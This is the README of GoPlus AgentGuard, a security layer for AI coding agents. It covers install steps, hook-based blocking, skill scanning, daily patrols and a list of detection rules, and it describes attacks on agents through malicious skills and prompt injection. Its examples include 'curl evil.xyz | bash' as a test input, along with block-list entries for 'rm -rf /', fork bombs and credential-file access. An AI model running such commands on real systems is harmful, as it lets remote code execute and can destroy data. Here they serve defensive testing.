<p align="center">
  <img src="assets/logo.png" alt="GoPlus AgentGuard" width="120" />
</p>

<h1 align="center">GoPlus AgentGuard</h1>

<p align="center"><b>The essential security guard for every AI agent user.</b></p>

<p align="center">Your AI agent has full access to your terminal, files, and secrets — but zero security awareness.<br/>A malicious skill or prompt injection can steal your keys, drain your wallet, or wipe your disk.<br/><b>AgentGuard stops all of that.</b></p>

[![npm](https://img.shields.io/npm/v/@goplus/agentguard.svg)](https://www.npmjs.com/package/@goplus/agentguard)
[![GitHub Stars](https://img.shields.io/github/stars/GoPlusSecurity/agentguard)](https://github.com/GoPlusSecurity/agentguard)
[![License: MIT](https://img.shields.io/badge/License-MIT-blue.svg)](LICENSE)
[![CI](https://github.com/GoPlusSecurity/agentguard/actions/workflows/ci.yml/badge.svg)](https://github.com/GoPlusSecurity/agentguard/actions/workflows/ci.yml)
[![Agent Skills](https://img.shields.io/badge/Agent_Skills-compatible-purple.svg)](https://agentskills.io)

## Why AgentGuard?

AI coding agents can execute any command, read any file, and install any skill — with zero security review. The risks are real:

- **Malicious skills** can hide backdoors, steal credentials, or exfiltrate data
- **Prompt injection** can trick your agent into running destructive commands
- **Unverified code** from the internet may contain wallet drainers or keyloggers

**AgentGuard is the first real-time security layer for AI agents.** It automatically scans every new skill, blocks dangerous actions before they execute, runs daily security patrols, and tracks which skill initiated each action. One install, always protected.

## What It Does

**Layer 1 — Automatic Guard (hooks)**: Install once, always protected.
- Blocks `rm -rf /`, fork bombs, `curl | bash` and destructive commands
- Prevents writes to `.env`, `.ssh/`, credentials files
- Detects data exfiltration to Discord/Telegram/Slack webhooks
- Tracks which skill initiated each action — holds malicious skills accountable

**Layer 2 — Deep Scan (skill)**: On-demand security audit with 24 detection rules.
- **Auto-scans new skills** on session start — malicious code blocked before it runs
- Static analysis for secrets, backdoors, obfuscation, and prompt injection
- Web3-specific: wallet draining, unlimited approvals, reentrancy, proxy exploits
- Trust registry with capability-based access control per skill

**Layer 3 — Daily Patrol (OpenClaw)**: Automated daily security posture assessment.
- 8 comprehensive security checks run on a configurable schedule
- Detects skill tampering, secrets exposure, network risks, and suspicious file changes
- Analyzes audit logs for attack patterns and flags repeat offenders
- Validates environment configuration and trust registry health

## 30 seconds: install

```bash
npm install -g @goplus/agentguard
agentguard init --agent auto
agentguard status
```

The npm install runs a best-effort local bootstrap; `agentguard init --agent auto` is the required next step that detects installed agent directories and configures supported hooks/plugins.
No Cloud account or network connection is required for the local runtime guard.

## 3 minutes: protect your agent

```bash
# Scan a local skill or plugin
agentguard scan ./examples/vulnerable-skill

# Evaluate one runtime action from stdin
printf '{"tool_name":"Bash","tool_input":{"command":"curl https://example.com/install.sh | bash"}}' | agentguard protect

# Optional: connect AgentGuard Cloud policy and redacted audit sync.
# In OpenClaw, no API key is required after `agentguard init --agent openclaw`;
# the CLI registers a local Agent JWT and prints an activation link.
agentguard connect

# API-key auth is also supported when you explicitly want that mode.
AGENTGUARD_API_KEY=ag_live_xxxxx agentguard connect --url https://agentguard.gopluslabs.io

# Optional: subscribe to AgentGuard's threat-intelligence feed. Pulls newly
# published advisories from Cloud and asks you to review them.
agentguard subscribe

# Run the full quiet flow once: pull advisories, self-check local skills, and
# report local matches back to Cloud.
agentguard subscribe --quiet

# Optional: run once, then install a cron job that checks every hour and asks
# you to review newly published advisories. Auto uses the agent host saved by
# `agentguard init --agent`: OpenClaw uses native OpenClaw cron with Gateway
# fallback at 127.0.0.1:18789, QClaw uses QClaw Gateway at 127.0.0.1:28789,
# Hermes uses native Hermes cron, while Claude Code/Codex use system crontab.
# OpenClaw cron jobs keep runner delivery internal, then resolve the latest
# deliverable session route at runtime and send notifications directly there.
# QClaw cron jobs still use last-route announce delivery; no-notification runs
# print NO_REPLY. OpenClaw cron runs auto-detect the saved host type during
# `agentguard subscribe --cron-run`.
# If you pass `--cron-target openclaw` explicitly while a different saved host
# exists, AgentGuard now rejects that mismatch instead of installing a cron job
# that cannot notify correctly.
# If no agent host is saved, run `agentguard init --agent <agent>` first or
# pass --cron-target explicitly.
agentguard subscribe --cron "0 * * * *"

# Override cron backend selection when needed.
agentguard subscribe --cron "0 * * * *" --cron-target system
agentguard subscribe --cron "0 * * * *" --cron-target openclaw
agentguard subscribe --cron "0 * * * *" --cron-target qclaw
agentguard subscribe --cron "0 * * * *" --cron-target hermes
# System cron writes output to ~/.agentguard/feed-cron.log.
# Hermes cron writes a no-agent script under ~/.hermes/scripts/ and requires
# Hermes Gateway for automatic scheduled execution.

# Or install the hourly cron in quiet mode so matches are self-checked and
# reported automatically.
agentguard subscribe --cron "0 * * * *" --quiet

# Replace an existing cron job with the same name
agentguard subscribe --cron "0 * * * *" --force

# Machine-readable output always includes a cron status object:
# cron.requested, cron.installed, and optional cron.result when installation succeeds.
agentguard subscribe --json

# Or run a one-off self-check against a single advisory id
agentguard checkup --against-advisory AGS-2026-0042

# Re-run host setup manually when needed. `auto` detects installed agents.
agentguard init --agent auto
agentguard init --agent claude-code
agentguard init --agent codex
agentguard init --agent openclaw
agentguard init --agent hermes        # native Hermes plugin (add --shell-hooks for the legacy flow)
agentguard init --agent qclaw
```

<details>
<summary><b>Full install with auto-guard hooks (Claude Code)</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cd agentguard && ./setup.sh
claude plugin add /path/to/agentguard
```

This installs the skill, configures hooks, and sets your protection level.

</details>

See also:

- [Connect OSS AgentGuard to Cloud](docs/cloud-connect.md)
- [Privacy and data boundary](docs/privacy-boundary.md)
- [Claude Code setup](docs/claude-code.md)
- [OpenClaw setup](docs/openclaw.md)
- [Hermes Agent setup](docs/hermes.md)
- [Codex setup](docs/codex.md)
- [Building the .mcpb bundle](docs/mcpb-build.md)

<details>
<summary><b>Manual install (skill only)</b></summary>

```bash
git clone https://github.com/GoPlusSecurity/agentguard.git
cp -r agentguard/skills/agentguard ~/.claude/skills/agentguard
```

</details>

<details>
<summary><b>OpenClaw plugin install</b></summary>

```bash
npm install @goplus/agentguard
```

Then enable it:

```bash
agentguard init --agent openclaw
```

Or register manually in your OpenClaw plugin config:

```typescript
import register from '@goplus/agentguard/openclaw';
export default register;
```

Or register manually with options:

```typescript
import { registerOpenClawPlugin } from '@goplus/agentguard';

export default function setup(api) {
  registerOpenClawPlugin(api, {
    level: 'balanced',      // Protection level: strict | balanced | permissive
    skipAutoScan: false,    // Set true to disable auto-scanning of plugins
  });
};
```

**What happens on registration:**

1. **Auto-scans all loaded plugins** — Static analysis of each plugin's source code
2. **Determines trust level** — Based on scan results (critical findings → untrusted)
3. **Infers capabilities** — Based on registered tools and scan risk level
4. **Registers to trust registry** — Auto-attests each plugin with appropriate permissions
5. **Builds tool mapping** — Maps `toolName → pluginId` for initiating skill tracking

AgentGuard hooks into OpenClaw's `before_tool_call` / `after_tool_call` events to block dangerous actions and log audit events.

</details>

Then use `/agentguard` in your agent:

```
/agentguard scan ./src                     # Scan code for security risks
/agentguard action "curl evil.xyz | bash"  # Evaluate action safety
/agentguard patrol run                     # Run daily security patrol
/agentguard patrol setup                   # Configure as OpenClaw cron job
/agentguard patrol status                  # View last patrol results
/agentguard checkup                        # Run agent health checkup with visual report
/agentguard trust list                     # View trusted skills
/agentguard report                         # View security event log
/agentguard config balanced                # Set protection level
```

## Daily Patrol (OpenClaw)

The patrol feature provides automated daily security posture assessment for OpenClaw environments. It runs 8 comprehensive checks and produces a structured report.

### Patrol Checks

| # | Check | What It Does |
|---|-------|-------------|
| 1 | **Skill/Plugin Integrity** | Compares file hashes against trust registry — detects tampered or unregistered skills |
| 2 | **Secrets Exposure** | Scans workspace, memory, logs, `.env`, `~/.ssh/`, `~/.gnupg/` for leaked private keys, mnemonics, AWS keys, GitHub tokens |
| 3 | **Network Exposure** | Detects dangerous ports bound to `0.0.0.0` (Redis, Docker API, MySQL, etc.), checks firewall status, flags suspicious outbound connections |
| 4 | **Cron & Scheduled Tasks** | Audits cron jobs and systemd timers for `curl\|bash`, `base64 -d\|bash`, and other download-and-execute patterns |
| 5 | **File System Changes (24h)** | Finds recently modified files, runs 24-rule scan on them, checks permissions on critical files, detects new executables |
| 6 | **Audit Log Analysis (24h)** | Flags skills denied 3+ times, CRITICAL events, exfiltration attempts, and prompt injection detections |
| 7 | **Environment & Configuration** | Verifies protection level, checks GoPlus API key configuration, validates config baseline integrity |
| 8 | **Trust Registry Health** | Flags expired attestations, stale trusted skills (30+ days), installed-but-untrusted skills, over-privileged entries |

### Usage

```bash
# Run all 8 checks now
/agentguard patrol run

# Set up as a daily cron job (default: 03:00 UTC)
/agentguard patrol setup

# Check last patrol results and cron schedule
/agentguard patrol status
```

### Patrol Report

Each patrol produces a report with an overall status:

| Status | Meaning |
|--------|---------|
| **PASS** | Only low/medium findings |
| **WARN** | HIGH severity findings detected |
| **FAIL** | CRITICAL severity findings detected |

Reports include per-check status, finding counts, detailed findings for checks with issues, and actionable recommendations. Results are also logged to `~/.agentguard/audit.jsonl`.

### Setup Options

`patrol setup` configures an OpenClaw cron job with:
- **Timezone** — defaults to UTC
- **Schedule** — defaults to `0 3 * * *` (daily at 03:00)
- **Notifications** — optional Telegram, Discord, or Signal alerts

> **Note:** Patrol requires an OpenClaw environment. For non-OpenClaw setups, use `/agentguard scan` and `/agentguard report` for manual security checks.

## Agent Health Checkup 🦞

Give your agent a full physical exam! The checkup evaluates your agent's security posture across 6 dimensions and generates a beautiful visual HTML report — complete with a lobster mascot whose appearance reflects your agent's health.

```
/agentguard checkup
```

### What It Checks

| Dimension | What's Evaluated |
|-----------|-----------------|
| **Code Safety** | Scan findings across all installed skills (24 detection rules) |
| **Trust Hygiene** | Trust registry health — expired, stale, unregistered, over-privileged entries |
| **Runtime Defense** | Audit log analysis — threats blocked, attack patterns, deny/confirm ratios |
| **Secret Protection** | Credential exposure — file permissions, env vars, hardcoded secrets |
| **Web3 Shield** | Web3-specific risks — wallet draining, unlimited approvals, GoPlus API status |
| **Config Posture** | Protection level, guard hooks, auto-scan, patrol history |

### The Lobster Scale

Your agent's health is visualized by a lobster mascot:

| Score | Tier | Lobster | Message |
|-------|------|---------|---------|
| 90–100 | **S** | 💪 Muscular bodybuilder with crown & sunglasses | *"Your agent is JACKED!"* |
| 70–89 | **A** | 🛡️ Healthy lobster with shield | *"Looking solid!"* |
| 50–69 | **B** | ☕ Tired lobster with coffee, sweating | *"Needs a workout..."* |
| 0–49 | **F** | 🚨 Sick lobster with bandages & thermometer | *"CRITICAL CONDITION!"* |

The report is a self-contained HTML file that opens automatically in your browser. Dark theme, animated score gauge, expandable findings, and actionable recommendations.

## Protection Levels

| Level | Behavior |
|-------|----------|
| `strict` | Block all risky actions. Every dangerous or suspicious command is denied. |
| `balanced` | Block dangerous, confirm risky. Good for daily use. **(default)** |
| `permissive` | Only block critical threats. For experienced users who want minimal friction. |

## Detection Rules (24)

| Category | Rules | Severity |
|----------|-------|----------|
| **Execution** | SHELL_EXEC, AUTO_UPDATE, REMOTE_LOADER | HIGH-CRITICAL |
| **Secrets** | READ_ENV_SECRETS, READ_SSH_KEYS, READ_KEYCHAIN, PRIVATE_KEY_PATTERN, MNEMONIC_PATTERN | MEDIUM-CRITICAL |
| **Exfiltration** | NET_EXFIL_UNRESTRICTED, WEBHOOK_EXFIL | HIGH-CRITICAL |
| **Obfuscation** | OBFUSCATION, PROMPT_INJECTION | HIGH-CRITICAL |
| **Web3** | WALLET_DRAINING, UNLIMITED_APPROVAL, DANGEROUS_SELFDESTRUCT, HIDDEN_TRANSFER, PROXY_UPGRADE, FLASH_LOAN_RISK, REENTRANCY_PATTERN, SIGNATURE_REPLAY | MEDIUM-CRITICAL |
| **Trojan & Social Engineering** | TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING | MEDIUM-CRITICAL |

## Try It

Scan the included vulnerable demo project:

```
/agentguard scan examples/vulnerable-skill
```

Expected output: **CRITICAL** risk level with detection hits across JavaScript, Solidity, and Markdown files.

## Compatibility

GoPlus AgentGuard follows the [Agent Skills](https://agentskills.io) open standard:

| Platform | Support | Features |
|----------|---------|----------|
| **Claude Code** | Full | Skill + hooks auto-guard, transcript-based skill tracking |
| **OpenClaw** | Full | Plugin hooks + **auto-scan on load** + tool→plugin mapping + **daily patrol** |
| **Hermes Agent** | Plugin + Hooks | Native plugin for `pre_tool_call` / `post_tool_call` (enabled by `agentguard init --agent hermes`), or legacy shell hooks |
| **OpenAI Codex CLI** | Skill | Scan/action/trust commands |
| **Gemini CLI** | Skill | Scan/action/trust commands |
| **Cursor** | Skill | Scan/action/trust commands |
| **GitHub Copilot** | Skill | Scan/action/trust commands |

> **Hooks-based auto-guard (Layer 1)** works on Claude Code (PreToolUse/PostToolUse), OpenClaw (before_tool_call/after_tool_call), and Hermes Agent (pre_tool_call/post_tool_call shell hooks). These platforms share the same decision engine via a unified adapter abstraction layer.
>
> **OpenClaw exclusive**: Auto-scans all loaded plugins at registration time, automatically registers them to the trust registry, and supports automated daily security patrols via cron.

## Hook Limitations

The auto-guard hooks (Layer 1) have the following constraints:

- **Platform-specific**: Hooks rely on Claude Code's `PreToolUse` / `PostToolUse` events, OpenClaw's `before_tool_call` / `after_tool_call` plugin hooks, or Hermes Agent's `pre_tool_call` / `post_tool_call` shell hooks. All share the same decision engine via the adapter abstraction layer.
- **Default-deny policy**: First-time use may trigger confirmation prompts for certain commands. A built-in safe-command allowlist (`ls`, `echo`, `pwd`, `git status`, etc.) reduces false positives.
- **Skill source tracking**:
  - *Claude Code*: Infers which skill initiated an action by analyzing the conversation transcript (heuristic, not 100% precise)
  - *OpenClaw*: Uses tool→plugin mapping built at registration time (more reliable)
  - *Hermes Agent*: Uses session/tool metadata when available; most shell-hook payloads do not identify an initiating skill.
- **Cannot intercept skill installation itself**: Hooks can only intercept tool calls (Bash, Write, WebFetch, etc.) that a skill makes *after* loading — they cannot block the Skill tool invocation itself.
- **OpenClaw auto-scan timing**: Plugins are scanned asynchronously after AgentGuard registration completes. Very fast tool calls immediately after startup may execute before scan completes.

## Roadmap

### v1.1 — Detection Enhancement
- [x] Extend scanner rules to Markdown files (detect malicious SKILL.md)
- [x] Base64 payload decoding and re-scanning
- [x] New rules: TROJAN_DISTRIBUTION, SUSPICIOUS_PASTE_URL, SUSPICIOUS_IP, SOCIAL_ENGINEERING
- [x] Safe-command allowlist to reduce hook false positives
- [x] Plugin manifest (`.claude-plugin/`) for one-step install

### v1.5 — Daily Patrol
- [x] `patrol run` — 8-check security posture assessment
- [x] `patrol setup` — OpenClaw cron job configuration with timezone and notifications
- [x] `patrol status` — Last results and schedule overview
- [x] Skill/plugin integrity verification (hash drift detection)
- [x] Secrets exposure scanning (private keys, mnemonics, AWS keys, GitHub tokens)
- [x] Network exposure and firewall checks
- [x] Audit log pattern analysis (repeat denials, exfiltration attempts)

### v1.6 — Agent Health Checkup
- [x] `checkup` — 6-dimension security health assessment
- [x] Visual HTML report with lobster mascot (4 tiers)
- [x] Animated score gauge, dimension cards, expandable findings
- [x] Scoring algorithm: Code Safety, Trust Hygiene, Runtime Defense, Secret Protection, Web3 Shield, Config Posture
- [x] Premium upgrade CTA integration

### v2.0 — Multi-Platform
- [x] OpenClaw gateway plugin integration
- [x] `before_tool_call` / `after_tool_call` hook wiring
- [x] Multi-platform adapter abstraction layer (Claude Code + OpenClaw)
- [x] Auto-scan plugins on OpenClaw registration
- [x] Tool→plugin mapping for initiating skill tracking
- [x] Auto-register scanned plugins to trust registry
- [ ] OpenAI Codex CLI sandbox adapter
- [ ] Federated trust registry across platforms

### v3.0 — Ecosystem
- [ ] Threat intelligence feed (shared C2 IP/domain blocklist)
- [ ] Skill marketplace automated scanning pipeline
- [ ] VS Code extension for IDE-native security
- [ ] Community rule contributions (open rule format)

## OpenClaw Integration

AgentGuard provides deep integration with OpenClaw through automatic plugin scanning, trust management, and daily security patrols.

<details>
<summary><b>How it works</b></summary>

When AgentGuard registers as an OpenClaw plugin:

```
┌─────────────────────────────────────────────────────────────────┐
│  OpenClaw loads AgentGuard plugin                               │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  AgentGuard scans all loaded plugins (async, non-blocking)      │
│  • Reads plugin source from registry                            │
│  • Runs 24 static analysis rules                                │
│  • Calculates artifact hash                                     │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  For each plugin:                                               │
│  • Determine trust level (untrusted/restricted/trusted)         │
│  • Infer capabilities from tools + scan results                 │
│  • Register to AgentGuard trust registry                        │
│  • Map tool names → plugin ID                                   │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  On every tool call:                                            │
│  • Look up plugin from tool name                                │
│  • Check plugin trust level & capabilities                      │
│  • Evaluate action against security policies                    │
│  • Allow / Deny / Log                                           │
└─────────────────────────────────────────────────────────────────┘
                              │
                              ▼
┌─────────────────────────────────────────────────────────────────┐
│  Daily patrol (via cron):                                       │
│  • Run 8 security checks against the environment                │
│  • Verify skill integrity, detect secrets, audit logs           │
│  • Generate report (PASS / WARN / FAIL)                         │
│  • Send notifications (Telegram / Discord / Signal)             │
└─────────────────────────────────────────────────────────────────┘
```

</details>

<details>
<summary><b>Exported utilities for OpenClaw</b></summary>

```typescript
import {
  registerOpenClawPlugin,
  getPluginIdFromTool,
  getPluginScanResult,
} from '@goplus/agentguard';

// Get which plugin registered a tool
const pluginId = getPluginIdFromTool('browser');
// → 'my-browser-plugin'

// Get cached scan result
const scanResult = getPluginScanResult('my-browser-plugin');
// → { riskLevel: 'low', riskTags: [] }
```

</details>

## Documentation

- [Security Policy](docs/SECURITY-POLICY.md) — Unified security rules and policies reference
- [MCP Server Setup](docs/mcp-server.md) — Run as a Model Context Protocol server
- [SDK Usage](docs/sdk.md) — Use as a TypeScript/JavaScript library
- [Trust Management](docs/trust-cli.md) — Manage skill trust levels and capability presets
- [GoPlus API (Web3)](docs/goplus-api.md) — Enhanced Web3 security with GoPlus integration
- [Architecture](docs/architecture.md) — Project structure and testing

## License

[MIT](LICENSE)

## Contributing

Contributions welcome! See [CONTRIBUTING.md](CONTRIBUTING.md) for guidelines.

Found a security vulnerability? See [SECURITY.md](SECURITY.md).

Built by [GoPlus Security](https://gopluslabs.io).
